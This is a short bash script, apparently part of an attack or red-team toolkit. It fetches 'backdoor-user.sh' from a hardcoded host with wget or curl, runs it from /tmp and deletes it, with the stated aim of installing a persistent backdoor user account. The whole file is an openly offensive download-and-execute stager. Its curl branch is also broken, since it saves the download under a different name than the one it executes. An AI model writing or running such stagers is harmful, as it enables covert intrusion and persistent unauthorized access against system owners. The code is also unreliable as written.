#!/bin/bash

# Requires root access

FALSE=$(/bin/false)
HAS_WGET=$(which wget)
HAS_CURL=$(which curl)
IP="10.2.45.121"
PORT="11000"

cd /tmp

if [[ "$HAS_WGET" != "$FALSE" ]];
then
	wget "http://$IP:$PORT/persistence/service/user/backdoor-user.sh"
	chmod +x backdoor-user.sh
	./backdoor-user.sh
	rm backdoor-user.sh
	exit
fi

if [[ "$HAS_CURL" != "$FALSE" ]];
then
	curl "http://$IP:$PORT/persistence/service/user/backdoor-user.sh" -o user.sh
	chmod +x backdoor-user.sh
	./backdoor-user.sh
	rm backdoor-user.sh
	exit
fi
